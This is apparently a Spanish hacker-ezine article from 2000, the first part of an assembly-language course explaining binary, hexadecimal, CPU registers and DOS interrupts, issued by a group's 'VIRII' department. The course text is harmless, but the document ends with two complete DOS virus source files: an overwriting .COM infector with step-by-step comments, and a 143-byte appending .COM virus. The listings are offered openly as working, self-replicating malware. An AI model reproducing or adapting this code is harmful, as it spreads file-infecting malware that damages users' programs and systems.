<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< DP 3 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
**** [ S_K ][ s-k@bigfoot.com ] ****************** { ASM } ***************
--------------------------------------------------------------------------

CURSO DE ASM (1ª entrega)
^^^^^^^^^^^^^^^^^^^^^^^^^

-Introduccion:

ASM??? Que es eso??? Pero eso no es muy dificil??? <-- Tipicas preguntas de la
gente cuando oye hablar a alguien de ensamblador, bytes, registros, y un
largo etc.
Pues yo debo deciros que NO, no es nada dificil programar en ASM. En realidad
solo hay que saberse unas poquitas cosas, porque ordenes hay muy pocas, pero
con esas pocas puedes hacer muchas cosas. Los datos que debes meter en los
registros (luego sabreis de que estoy hablando) no los debeis saber de memoria,
porque estan en hexadecimal y cualquier libro de ASM los trae. Asi que ya vereis
mas adelante lo facil y divertido que es programar en ensamblador.



-Binario, decimal, hexadecimal, etc:
Lo primero es conocer los sistemas de calculo que se utilizan en ASM, que no es
el decimal que todos utilizamos (0,1,2,3,4,5,6,7,8,9). El microprocesador
solo puede procesar datos en binario, es decir en base 2 (0,1). Para que
os hagais una idea: cuando vosotros ejecutais un programa aunque ese
programa este hecho en pascal o lo que sea, el programa envia datos al
procesador en binario, porque es lo unico que el procesador es capaz de
leer. El sistema binario se utilizan solo 1 y 0. Asi que si veis un numero
escrito asi: 0,1,1,0,0,0,1,1 eso es un numero en binario y en decimal ese
seria el numero 99. ¿por que?, muy simple. En realidad el 0 y el 1 no son
como en el sistema decimal, (haber... que me lio yo solo), el 1 podemos
decir que es ACTIVADO y el 0 DESACTIVADO. Para que lo entendais mejor:

Nº en binario:  0,0,0,0,0,1,0,1
Nº en decimal: 5

Para calcularlo utilizariamos la siguiente tabla, donde 2^0 es 2 elevado a 0.
2^7  2^6  2^5  2^4  2^3  2^2  2^1  2^0
128  64   32    16    8     4     2     1

Entonces lo que hariamos seria coger los numero de esta tabla que son 1
en el numero en binario, en este caso el 2^2=4 y el 2^0=1, los sumamos y
dan 5 :)

Mas ejemplos:
binario: 1,0,0,0,0,0,1,1  decimal: 131
binario: 0,0,1,1,1,1,0,0  decimal: 60

Ok, esto esta visto. Ahora ¿por que he puesto 8 numeros siempre?, pues
por lo siguiente: Un byte esta compuesto por 8 bits y cada bit es un 0 un
1 en numero binario, por lo tanto un byte sera un numero en binario
compuesto por 8 digitos. Dicho esto, podemos decir que cada byte tiene 256
funciones distintas, porque se puede escribir de 256 maneras distintas.
Desde 0,0,0,0,0,0,0,0=0 hasta 1,1,1,1,1,1,1,1=255 Que mas... ah! si!.
Tambie os sonara eso de 16 bits 32 bits, etc. Pues 16 bits son 2 bytes.
Con 16 bits tenemos ya 65536 funciones y con 32 bits, 4294967296 funciones.
A los 16 bits (2 bytes) se les llama WORD o PALABRA y a los 32 bits (4 bytes)
DOUBLE WORD o DOBLE PALABRA.
Quizas os suene esto de la configuracion de la pantalla, 16 bits, 32
bits. Esto quiere decir que si tenemos seleccionada la opcion 16 bits
tendremos 65536 colores distintos.

Bueno pues con todo esto se puede deducir que el microprocesador lee
bytes, y segun que bits esten activados y cuales no pues debera hacer una
u otra cosa.

Logicamente seria muy complejo escribir programas en binario, asi que se
inventaron el sistema hexadecimal, base 16, y como no tenian 16 numeros
distintos le pusieron letras (0,1,2,3,4,5,6,7,8,9,A,B,C,D,E,F). Segun
esto, el numero 79 en hexadecimal seria 4F. Para calcular un numero en
hexadecimal debeis hacer lo siguiente:

Dividis el numero en decimal entre 16, el cociente sera la primera parte del numero:
79/16  cociente:4    resto: 15 ---->F y el resto correspondera al otro
digito. Si el resto es 0,1,2,3,4,5,6,7,8,9 pues sera ese numero, pero si
el resto es 10,11,12,13,14,15 sera A,B,C,D,E,F respectivamente.

Uffff, que royazo estoy escribiendo. Todo esto es para que sepais bien
los sistemas, pero para esto nos vendra bien una calculadora que pase
numeros entre los tres sistemas (decimal, binario y hexadecimal). Windows
trae una, Si!!! trae una. La calculadora de win, la poneis en CIENTIFICA y
teneis esa opcion.

Ahora, porque os he explicado el sistema hexadecimal, pues porque sera el que 
utilizemos para programar en ASM.



-Registros:
Por fin comenzamos con el verdadero ensamblador :)
Lo primero que debeis conocer son los registros. Estos son una especie de
memoria temporal, que tiene el procesador, donde se meten las funciones
para que luego sean ejecutadas.
Hay varios registros:
El CS, indica el segmento en el que se encuentra el programa. Es de dos bytes.
El IP, indica el offset actual. Es de dos bytes.

Para comprobar esto podeis ejecutar el debug de win y poner A <enter>, os saldra
algo asi:  xxxx:0100 pues el numero xxxx es el registro CS y el 0100 es el IP.

El DS y el ES, se utilizan para muchas cosas, como imprimir cadenas,
mover datos en memoria, para utilizar como punteros, etc. De dos bytes.
El SS es la pila o stack, y el SP contiene el offset de la pila, pero mas
adelante ya explicare esto en profundidad.
El SI, DI y BP que tambien los utilizaremos como punteros, entre otras cosas, y 
tambien son de dos bytes.

Y ahora los que mas utilizaremos, el AX,BX,CX,DX. Todos ellos son de dos bytes,
pero se pueden dividir en dos de un byte, AH,AL,BH,BL,CH,CL,DH,DL. La L de low
y la H de high, parte alta y parte baja del registro.

AX, lo utilizaremos para indicar las funciones a las interrupciones.
BX, lo utilizaremos para trabajar con ficheros.
CX, como contador.
DX,es el registro de datos, lo utilizaremos como puntero.
Aunque todos ellos nos serviran como proposito general, es decir para
hacer muhas cosas, y no solo una cosa especifica de cada uno.



-Ordenes, funciones e interrupciones:
Las ordenes son las que os tendreis que saber de memoria. Se escriben con
letras, es decir como en cualquier lenguaje, por ejemplo: la orden de
mover se pone MOV.
Las funciones estan escritas en hexadecimal y le indican al procesador lo
que debe hacer, por ejemplo, la funcion 3e cierra un archivo.
Las interrupciones tambien os la debeis saber y le indican al procesador
que deben ejecutar la funcion metida con anterioridad en un registro. Para
cada tipo de funciones hay un tipo de interrupciones, por ejemplo la
interrupcion 10 se utiliza para funciones de video.

Un ejemplo completo para que lo veais todo:

MOV AL,6A       ;metemos en el registro AX la funcion 6A 
INT 10               ;la mandamos ejecutar
INT 20               ;salida al DOS (finaliza el programa)



Bueno, pues aqui acaba la primera entrega del curso. En la proxima comenzare a
explicar las diferentes ordenes y pondre algunos programas de ejemplo.
Cualquier duda que tengais sobre lo visto en este articulo mandame un
e-mail comentandola y os contestare :)

Un saludo de S_K.

byez aLL

(C) NH community 2000
Dept. de VIRII


<++> DP3/CURSOS/ASM/firstvir.asm

; Infecta archivos .COM menores o iguales a 45 bytes
;by S_K

comienzo:         
                     mov ah,4eh                     ;funcion buscar archivo
                     mov dx,offset tipo            ;puntero dirigido a tipo

buscarabrir:
                     int 21h                           
                     jc final                            ;si no encuentra archivo finaliza programa (bit de acarreo en 1), si lo encuentra continua (bit de acarreo en 0)
         
                     mov ax,3d02                   ;funcion abrir archivo
                     mov dx,9eh                     ;selecciona los datos DTA del archivo encontrado
                     int 21h           
                     jc cerrar                          ;si ya esta infectado cierra archivo (bit de acarreo en 1) y busca otro, si no esta infectado (bit de acarreo en 0) continua

                     xchg bx,ax                      ;mete los datos del registro AX en BX para que no los muestre al final del programa en la ventana del mismo

                     mov ah,40h                      ;funcion de copiar codigo
                     mov cl,longitud                 ;indica en el registro del contador la memoria que ocupa el virus
                     mov dx,offset comienzo     ;puntero indicando desde donde se debe copiar
                     int 21h 

cerrar:
                     mov ah,3eh                       ;funcion cerrar archivo
                     int 21h

                     mov ah,4fh                        ;funcion buscar otro archivo
                     jmp buscarabrir                 ;salta a buscarabrir para iniciar la busqueda de un nuevo archivo

final:
                     int 20h                             ;sale al dos

tipo db          '*.COM',0                            ;tipo de ficheros a buscar e infectar

theend:
longitud         equ offset theend - offset comienzo   ;indica la memoria que ocupa el virus

<-->


<++> DP3/CURSOS/ASM/append.asm

;Small appending virus - 143 bytes

CSEG	SEGMENT
	ASSUME	CS:CSEG, DS:CSEG

		ORG	100h

Virus_Length	equ	End_Virus-Begin_Virus

Start:
		db	'M',0e9h,0,0

Begin_Virus:
		call	Delta

Delta:
		pop	bp
		sub	bp,offset Delta
		push	si
		push	si

		mov	ah,1ah
		lea	dx,[bp+DTA]
		int	21h

		pop	di
		lea	si,[bp+OldBytes]
		movsw
		movsw

		mov	ah,4eh
		mov	cx,7h
		lea	dx,[bp+ComMask]

Find_Next:
		int	21h
		jc	Return

		mov	ax,3d02h
		lea	dx,[bp+DTA+1eh]
		int	21h

		xchg	ax,bx

		mov	ah,3fh
		mov	cx,4
		lea	dx,[bp+OldBytes]
		int	21h

		cmp	byte ptr [bp+OldBytes],'M'
		je	Close_Find_Next

		mov	ax,4202h
		xor	cx,cx
		cwd
		int	21h

		sub	ax,4
		mov	word ptr [bp+NewBytes+2],ax

		mov	ah,40h
		mov	cx,Virus_Length
		lea	dx,[bp+Begin_Virus]
		int	21h

		mov	ax,4200h
		xor	cx,cx
		cwd
		int	21h

		mov	ah,40h
		mov	cx,4
		lea	dx,[bp+NewBytes]
		int	21h

Close_Find_Next:
		mov	ah,3eh
		int	21h

		mov	ah,4fh
		jmp	short Find_Next

ComMask		db	"*.COM",0
NewBytes	db	'M',0e9h,0,0
OldBytes	db	0cdh,20h,0,0

Return:
		mov	ah,1ah
		mov	dx,80h
		int	21h

		ret

End_Virus:
DTA		db	42 dup (?)

CSEG	ENDS
	END	START

<-->

